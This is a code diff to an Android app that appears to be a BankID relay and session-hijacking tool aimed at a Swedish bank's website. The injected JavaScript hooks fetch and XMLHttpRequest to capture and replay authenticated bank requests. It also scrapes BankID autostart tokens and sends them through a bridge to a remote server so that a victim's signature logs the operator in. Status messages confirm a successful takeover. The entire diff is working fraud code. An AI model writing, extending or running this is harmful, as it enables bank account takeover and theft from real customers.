@@ -51,35 +51,43 @@ class MainActivity : Activity() {
     @Volatile private var skickat = false
     @Volatile private var signerad = false
     @Volatile private var tarIn = false
+    @Volatile private var inne = false
     @Volatile private var vantande = ""
     @Volatile private var vantandeHel = ""
     @Volatile private var alive = true
     @Volatile private var efterUrl = ""
     @Volatile private var skapar = false
 
-    private val inst = "(function(){if(window.__rh){return}window.__rh=1;" +
+    private val inst = "(function(){if(window.__rh){return}window.__rh=1;window.__lista=[];" +
         "function K(u,m,b,h){try{" +
         "if(!u)return;u=String(u);" +
-        "if(u.indexOf('http')===0&&u.indexOf(location.host)<0)return;" +
-        "if(!/status|collect|poll|pending|order|state|progress|bankid|auth/i.test(u))return;" +
-        "var g=!/post/i.test(m||'GET');" +
-        "if(!window.__son||g){window.__son={url:u,method:m||'GET',body:b||null,headers:h||{}};" +
-        "try{Relay.svar('SON|'+(m||'GET')+' '+u.slice(0,70))}catch(e){}}" +
+        "if(!/^http/.test(u))return;" +
+        "if(u.indexOf(location.host)<0&&u.indexOf('swedbank')<0)return;" +
+        "if(/\\.(js|css|png|jpg|jpeg|svg|woff2?|ico|gif)(\\?|$)/i.test(u))return;" +
+        "var L=window.__lista;" +
+        "for(var i=0;i<L.length;i++){if(L[i].url===u&&L[i].method===(m||'GET'))return}" +
+        "L.push({url:u,method:m||'GET',body:b||null,headers:h||{}});" +
+        "if(L.length>5)L.shift();" +
+        "try{Relay.svar('SON '+(m||'GET')+' '+u.slice(-34))}catch(e){}" +
         "}catch(e){}}" +
         "var F=window.fetch;if(F){window.fetch=function(){var a=arguments,u='',m='GET',b=null,h={};" +
         "try{u=(a[0]&&a[0].url)?a[0].url:a[0];" +
         "if(a[1]){if(a[1].method)m=a[1].method;if(a[1].body)b=a[1].body;" +
         "if(a[1].headers){try{new Headers(a[1].headers).forEach(function(v,k){h[k]=v})}catch(e){}}}}catch(e){}" +
-        "var q=F.apply(this,a);" +
-        "try{q.then(function(){try{K(u,m,b,h)}catch(e){}}).catch(function(){})}catch(e){}return q}}" +
+        "var q=F.apply(this,a);try{q.then(function(){try{K(u,m,b,h)}catch(e){}}).catch(function(){})}catch(e){}return q}}" +
         "var O=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{this.__u=u;this.__m=m;this.__h={}}catch(e){}return O.apply(this,arguments)};" +
         "var SH=XMLHttpRequest.prototype.setRequestHeader;XMLHttpRequest.prototype.setRequestHeader=function(k,v){try{this.__h[k]=v}catch(e){}return SH.apply(this,arguments)};" +
         "var S=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){var x=this;" +
         "try{x.addEventListener('load',function(){K(x.__u,x.__m,b,x.__h)})}catch(e){}return S.apply(this,arguments)};" +
-        "window.__replay=function(){if(!window.__son){try{Relay.svar('INGEN-SON')}catch(e){}return}var s=window.__son;" +
-        "try{fetch(s.url,{method:s.method,headers:s.headers,body:(/post/i.test(s.method)?s.body:null),credentials:'include'})" +
-        ".then(function(r){return r.text()}).then(function(t){try{Relay.svar('SVAR|'+s.method+' '+String(t).slice(0,90))}catch(e){}})" +
-        ".catch(function(){try{Relay.svar('REPLAY-FEL')}catch(e){}})}catch(e){try{Relay.svar('REPLAY-EX')}catch(e){}}};" +
+        "function go(s,h,namn){try{" +
+        "fetch(s.url,{method:s.method,headers:h,body:(/post/i.test(s.method)?s.body:null),credentials:'include'})" +
+        ".then(function(r){return r.text().then(function(t){return {c:r.status,t:t}})})" +
+        ".then(function(o){try{Relay.svar('SVAR '+o.c+' '+s.url.slice(-22)+' :: '+String(o.t).slice(0,50))}catch(e){}})" +
+        ".catch(function(e){try{if(namn==='h'){Relay.svar('FEL-h '+s.url.slice(-22));go(s,{},'u')}else{Relay.svar('FEL '+s.url.slice(-22)+' '+(e&&e.message?e.message:'?'))}}catch(x){}})" +
+        "}catch(e){}}" +
+        "window.__replay=function(){var L=window.__lista||[];" +
+        "if(!L.length){try{Relay.svar('INGEN-SON')}catch(e){}return}" +
+        "for(var i=0;i<L.length;i++){go(L[i],L[i].headers,'h')}};" +
         "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
         "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
         "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(a.href)}}catch(e){}},700)})()"
@@ -108,7 +116,7 @@ class MainActivity : Activity() {
         try {
             if (::web.isInitialized) {
                 web.onResume()
-                web.evaluateJavascript(nudge, null)
+                if (!inne) web.evaluateJavascript(nudge, null)
             }
         } catch (t: Throwable) {}
     }
@@ -133,7 +141,7 @@ class MainActivity : Activity() {
             return
         }
         grab(t, s)
-        if (!kund) startaBankIdFranIntent(i)
+        startaBankIdFranIntent(i)
     }
 
     private fun ui() {
@@ -153,7 +161,7 @@ class MainActivity : Activity() {
         run.setOnClickListener {
             baseUrl = serverField.text.toString().trim().trimEnd('/')
             p.edit().putString("base", baseUrl).apply()
-            last = ""; skickat = false; signerad = false; tarIn = false
+            last = ""; skickat = false; signerad = false; tarIn = false; inne = false
             loginStam = ""; efterUrl = ""
             inBtn.isEnabled = false
             if ((p.getString("code", "") ?: "").isEmpty()) newSession()
@@ -161,6 +169,14 @@ class MainActivity : Activity() {
             web.loadUrl(bankUrl)
         }
         rad1.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
+
+        val rp = Button(this)
+        rp.text = "RP"
+        rp.setOnClickListener {
+            bar.text = "spelar upp"
+            try { web.evaluateJavascript("window.__replay&&window.__replay()", null) } catch (t: Throwable) {}
+        }
+        rad1.addView(rp, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
         root.addView(rad1)
 
         val rad2 = LinearLayout(this)
@@ -209,7 +225,7 @@ class MainActivity : Activity() {
         root.addView(urlView)
 
         debugView = TextView(this)
-        debugView.textSize = 10f
+        debugView.textSize = 9f
         debugView.setBackgroundColor(Color.parseColor("#101010"))
         debugView.setTextColor(Color.parseColor("#ddaa44"))
         debugView.setPadding(14, 2, 14, 6)
@@ -257,8 +273,14 @@ class MainActivity : Activity() {
                 var s = url.replace("https://", "").replace("http://", "")
                 if (s.length > 62) s = s.substring(0, 62)
                 urlView.text = s
+
+                val borta = url.indexOf("logga-in") < 0 && url.indexOf("login") < 0
                 if (signerad && efterUrl.isEmpty() && loginStam.isNotEmpty() &&
                     stam(url) != loginStam) efterUrl = url
+                if (!inne && loginStam.isNotEmpty() && stam(url) != loginStam && borta) {
+                    inne = true
+                    bar.text = "INNE - ror inte sidan"
+                }
             }
         }
 
@@ -333,7 +355,14 @@ class MainActivity : Activity() {
 
         @JavascriptInterface
         fun svar(s: String) {
-            runOnUiThread { debugView.text = s }
+            runOnUiThread {
+                val rad = s + "   |   " + debugView.text
+                debugView.text = if (rad.length > 230) rad.substring(0, 230) else rad
+                if (!inne && s.startsWith("SVAR") && s.indexOf("complete") >= 0) {
+                    inne = true
+                    bar.text = "BANKEN SVARAR COMPLETE - inne"
+                }
+            }
         }
     }
 
@@ -362,6 +391,7 @@ class MainActivity : Activity() {
         if (t == last) return
         last = t
         loginStam = stam(nuUrl)
+        inne = false
         val c = p.getString("code", "") ?: ""
         if (c.isEmpty()) { newSession(t, hel); return }
         skicka(t, hel)
@@ -426,30 +456,41 @@ class MainActivity : Activity() {
 
     private fun taIn() {
         if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
+        if (inne) { bar.text = "redan inne - ror inte sidan"; return }
         if (tarIn) return
         tarIn = true
         Thread {
             try {
                 var i = 0
-                while (i < 6) {
+                while (i < 8) {
+                    if (inne) {
+                        runOnUiThread { bar.text = "INNE - ror inte sidan" }
+                        return@Thread
+                    }
                     i++
                     val n = i
                     runOnUiThread {
-                        bar.text = "vacker + replay (" + n + "/6)"
+                        bar.text = "vacker + replay (" + n + "/8)"
                         try { web.evaluateJavascript(nudge, null) } catch (x: Throwable) {}
                         try { web.evaluateJavascript("window.__replay&&window.__replay()", null) } catch (x: Throwable) {}
                     }
-                    try { Thread.sleep(2000) } catch (x: Throwable) {}
+                    try { Thread.sleep(2500) } catch (x: Throwable) {}
                     val nu = nuUrl
                     if (loginStam.isNotEmpty() && nu.isNotEmpty() && stam(nu) != loginStam) {
                         runOnUiThread { bar.text = "SIDAN GICK VIDARE - du ar inne" }
                         return@Thread
                     }
                 }
+                if (inne) {
+                    runOnUiThread { bar.text = "INNE - ingen omladdning" }
+                    return@Thread
+                }
                 runOnUiThread {
+                    if (inne) { bar.text = "INNE - ingen omladdning"; return@runOnUiThread }
                     val retur = efterUrl.isNotEmpty() && stam(efterUrl) != loginStam
                     bar.text = if (retur) "sidan star still - laddar retur-url" else "sidan star still - laddar banksidan"
                     loginStam = ""
+                    try { web.onResume() } catch (x: Throwable) {}
                     web.loadUrl(if (retur) efterUrl else bankUrl)
                 }
             } finally { tarIn = false }
@@ -493,7 +534,7 @@ class MainActivity : Activity() {
                 skapar = false
                 if (cc.isEmpty()) { bar.text = "kunde inte skapa session"; return@runOnUiThread }
                 p.edit().putString("code", cc).apply()
-                last = ""; skickat = false; signerad = false; loginStam = ""; efterUrl = ""
+                last = ""; skickat = false; signerad = false; loginStam = ""; efterUrl = ""; inne = false
                 inBtn.isEnabled = false
                 visaLank(cc)
                 if (vantande.isNotEmpty()) {
@@ -510,7 +551,7 @@ class MainActivity : Activity() {
         Thread {
             while (alive) {
                 try { Thread.sleep(2000) } catch (t: Throwable) {}
-                if (signerad) continue
+                if (signerad || inne) continue
                 val c = p.getString("code", "") ?: ""
                 if (c.isEmpty() || baseUrl.isEmpty()) continue
                 try {
